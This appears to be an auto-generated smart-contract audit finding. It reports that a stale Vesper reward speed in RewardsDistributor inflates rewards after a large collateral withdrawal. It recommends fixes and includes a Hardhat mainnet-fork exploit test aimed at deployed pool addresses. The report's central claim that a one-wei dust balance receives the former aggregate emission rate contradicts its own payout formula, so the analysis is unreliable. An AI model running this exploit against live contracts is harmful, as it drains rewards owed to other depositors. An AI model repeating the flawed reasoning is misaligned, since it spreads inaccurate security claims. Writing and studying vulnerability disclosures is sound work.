### Title
Stale Vesper reward speed after collateral withdrawal lets dust balances drain distributor rewards - ([File: contracts/RewardsDistributor.sol])

### Summary
`DepositToken.withdraw` burns a user's deposit-token balance and pulls the underlying collateral from `Treasury`, but it only updates the reward index and does not recalculate the collateral's external Vesper reward speed. [1](#0-0) [2](#0-1) 

For Vesper collateral, `RewardsDistributor.syncTokenSpeed` derives the distributor's emission speed from the Treasury's current `vToken` balance, but that function is restricted to `tokenSpeedKeeper`. [3](#0-2) 

Between withdrawal and the next sync, `_calculateTokenIndex` continues distributing the old `tokenSpeed` over the now-smaller `DepositToken.totalSupply`. [4](#0-3) 

An unprivileged attacker who represents most of a reward-bearing collateral supply can therefore withdraw almost all of it, leave a dust balance, and receive the former aggregate emission rate on that dust balance. [5](#0-4) 

### Finding Description
`DepositToken._burn` calls every registered rewards distributor before reducing `balanceOf` and `totalSupply`. [6](#0-5) 

That checkpoint correctly credits the withdrawer for rewards accrued before the burn, but it does not adjust `tokenSpeeds` to reflect the Treasury's reduced external staking position. [7](#0-6) [8](#0-7) 

The relevant rate is supposed to equal the Treasury's share of the external Vesper reward stream:

```solidity
rewardRate * vPool.balanceOf(treasury) / vPool.totalSupply()
``` [9](#0-8) 

After `Treasury.pull`, the numerator decreases, while the stored `tokenSpeeds` value remains unchanged until `tokenSpeedKeeper` calls `syncTokenSpeed`. [10](#0-9) [11](#0-10) 

The stale rate is then divided by the reduced deposit-token supply, so a 99% withdrawal increases the per-share index growth by roughly 100 times. [12](#0-11) 

`claimRewards` transfers the resulting `tokensAccruedOf` balance to the account whenever the distributor has sufficient reward tokens. [13](#0-12) [14](#0-13) 

### Impact Explanation
This is theft of reward tokens and unclaimed yield rather than merely reducing the attacker's own future earnings. [15](#0-14) 

The attacker receives emissions attributable to collateral that has already left the Treasury, while the actual external Vesper rewards earned by the protocol fall with the Treasury's `vToken` balance. [10](#0-9) [9](#0-8) 

The inflated accrued balance can consume the distributor's current reward-token inventory before other suppliers or borrowers claim their legitimate shares. [16](#0-15) [14](#0-13) 

If the inflated entitlement exceeds the current inventory, `_transferRewardIfEnoughTokens` leaves it recorded in `tokensAccruedOf`, allowing it to consume subsequently claimed external rewards as well. [17](#0-16) 

### Likelihood Explanation
The attacker only needs to deposit reward-bearing Vesper collateral, wait for a normal speed synchronization that values the enlarged Treasury stake, withdraw almost the full deposit while retaining a dust balance, and call the public claim function. [18](#0-17) [1](#0-0) [19](#0-18) 

No privileged attacker role, forged caller, fake token, oracle manipulation, pause-state assumption, or reentrancy is required. [20](#0-19) [21](#0-20) 

The practical requirement is control of a large fraction of a synced reward-bearing deposit-token supply and enough distributor inventory to make the inflated accrual payable. [22](#0-21) [14](#0-13) 

### Recommendation
Update the external reward speed atomically before every supply-changing operation, or make the reward-index calculation derive directly from the Treasury's current `vToken` balance rather than a keeper-maintained `tokenSpeeds` cache. [6](#0-5) [11](#0-10) 

At minimum, `DepositToken.deposit`, `withdraw`, `withdrawFrom`, and `flashWithdraw` should cause the distributor to checkpoint the index, recalculate the collateral's external reward entitlement, and only then mutate supply. [23](#0-22) [21](#0-20) 

A safer design is to distribute only rewards actually claimed into the distributor, using deltas of the distributor's reward-token balance rather than a predicted external `rewardRate`. [22](#0-21) [24](#0-23) 

### Proof of Concept
The following Hardhat mainnet-fork test demonstrates the stale-rate amplification; the keeper call only establishes the normal synced state before the entirely public withdrawal and claim sequence.

```ts
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {time} from '@nomicfoundation/hardhat-network-helpers'
import {impersonateAccount, setTokenBalance} from './helpers'
import {address as POOL_ADDRESS} from '../deployments/mainnet/Pool1.json'
import {address as MSD_VAUSDC_ADDRESS} from '../deployments/mainnet/VaUSDCDepositToken_Pool1.json'

it('inflates rewards after nearly full collateral withdrawal', async function () {
  const [attacker] = await ethers.getSigners()

  const pool = await ethers.getContractAt('IPool', POOL_ADDRESS)
  const msd = await ethers.getContractAt('DepositToken', MSD_VAUSDC_ADDRESS)

  const distributorAddress = (await pool.getRewardsDistributors())[0]
  const distributor = await ethers.getContractAt(
    'RewardsDistributor',
    distributorAddress
  )

  expect(await distributor.tokenSpeeds(msd.address)).to.be.gt(0)

  const vToken = await ethers.getContractAt(
    [
      'function totalSupply() view returns(uint256)',
      'function balanceOf(address) view returns(uint256)',
      'function poolRewards() view returns(address)',
      'function approve(address,uint256) returns(bool)'
    ],
    await msd.underlying()
  )

  const treasury = await pool.treasury()
  const currentSupply = await msd.totalSupply()

  // Give the attacker enough collateral to dominate the reward supply.
  const attackerStake = currentSupply.mul(99)
  await setTokenBalance(vToken, attacker.address, attackerStake)

  await vToken.connect(attacker).approve(msd.address, attackerStake)
  await msd.connect(attacker).deposit(attackerStake, attacker.address)

  // Establish the ordinary synced state after the deposit. This is not an
  // attacker capability; it represents the production tokenSpeedKeeper.
  const keeperAddress = await distributor.tokenSpeedKeeper()
  const keeper = await impersonateAccount(keeperAddress)
  await distributor.connect(keeper).syncTokenSpeed(msd.address)

  const staleSpeed = await distributor.tokenSpeeds(msd.address)
  const rewards = await ethers.getContractAt('IERC20', await distributor.rewardToken())
  const poolRewardsAddress = await vToken.poolRewards()
  const poolRewards = await ethers.getContractAt(
    [
      'function rewardRates(address) view returns(uint256)',
      'function periodFinish(address) view returns(uint256)'
    ],
    poolRewardsAddress
  )

  // Leave one wei of reward-bearing deposit-token balance.
  const dust = 1
  await msd
    .connect(attacker)
    .withdraw((await msd.balanceOf(attacker.address)).sub(dust), attacker.address)

  const newSupply = await msd.totalSupply()
  const treasuryVTokenBalance = await vToken.balanceOf(treasury)
  const externalRate = await poolRewards.rewardRates(rewards.address)
  const vTokenSupply = await vToken.totalSupply()

  // The currently earned external speed after withdrawal.
  const fairSpeed = externalRate
    .mul(treasuryVTokenBalance)
    .div(vTokenSupply)

  expect(fairSpeed).to.be.lt(staleSpeed)

  const before = await rewards.balanceOf(attacker.address)

  await time.increase(1)
  await distributor.connect(attacker).claimRewards(attacker.address)

  const paid = (await rewards.balanceOf(attacker.address)).sub(before)

  // A dust holder receives approximately the pre-withdrawal aggregate speed
  // divided by the tiny remaining supply, instead of fairSpeed * dust/supply.
  const inflatedAccrual = staleSpeed.mul(dust).div(newSupply)
  const fairAccrual = fairSpeed.mul(dust).div(newSupply)

  expect(paid).to.be.gt(0)
  expect(paid).to.be.closeTo(inflatedAccrual, inflatedAccrual.div(100))
  expect(paid).to.be.gt(fairAccrual.mul(10))
})
```

The exploit works because the burn decreases `totalSupply` and `Treasury.pull` decreases the external reward-earning balance, while `tokenSpeeds` remains at its pre-withdrawal value until `syncTokenSpeed` runs. [6](#0-5) [2](#0-1) [22](#0-21)
